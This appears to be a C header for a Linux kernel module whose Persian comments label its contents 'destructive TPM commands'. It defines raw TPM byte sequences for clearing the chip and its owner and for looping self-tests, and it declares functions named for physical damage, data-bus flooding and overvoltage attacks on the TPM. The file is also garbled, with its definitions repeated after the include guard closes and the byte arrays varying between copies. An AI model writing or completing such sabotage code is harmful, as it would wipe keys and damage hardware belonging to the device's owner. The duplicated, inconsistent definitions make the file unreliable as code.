#ifndef TPM_ATTACK_H
#define TPM_ATTACK_H

#include <linux/tpm.h>

// دستورات مخرب TPM
#define TPM_CMD_CLEAR_OWNER      {0x80, 0x01, 0, 0, 0, 0x0C, 0, 0, 0x01, 0x5C, 0, 0}
#define TPM_CMD_SELF_TEST_LOOP   {0x80, 0x01, 0, 0, 0, 0x14, 0, 0, 0x01, 0x78}

// توابع
void tpm_physical_damage(struct tpm_chip *chip);
void tpm_flood_data_bus(void);
void tpm_overvoltage_attack(void);

#endif // TPM_ATTACK_H

// دستورات مخرب TPM
#define TPM_CMD_CLEAR        {0x80, 0x01, 0, 0, 0, 0x0C, 0, 0, 0x01, 0x5D}
#define TPM_CMD_CLEAR_OWNER  {0x80, 0x01, 0, 0, 0, 0x0C, 0, 0, 0x01, 0x5C}
#define TPM_CMD_SELF_TEST    {0x80, 0x01, 0, 0, 0, 0x14, 0, 0, 0x01, 0x78}

void tpm_physical_damage(struct tpm_chip *chip);

#endif // TPM_ATTACK_H
